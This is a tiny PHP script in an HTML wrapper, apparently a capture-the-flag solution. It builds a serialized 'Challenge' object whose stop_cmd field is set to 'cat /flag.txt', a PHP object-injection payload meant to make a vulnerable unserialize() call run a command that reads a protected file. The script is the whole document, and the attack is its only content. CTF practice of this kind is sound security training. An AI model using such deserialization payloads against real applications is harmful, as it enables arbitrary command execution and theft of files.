<!DOCTYPE html>
<html>
<body>


<?php

$c = new Challenge("bogus challenge", "just trying to print the flag, nothing to see here");
$c->stop_cmd = "cat /flag.txt";
print(serialize($c));

?>


</body>
</html>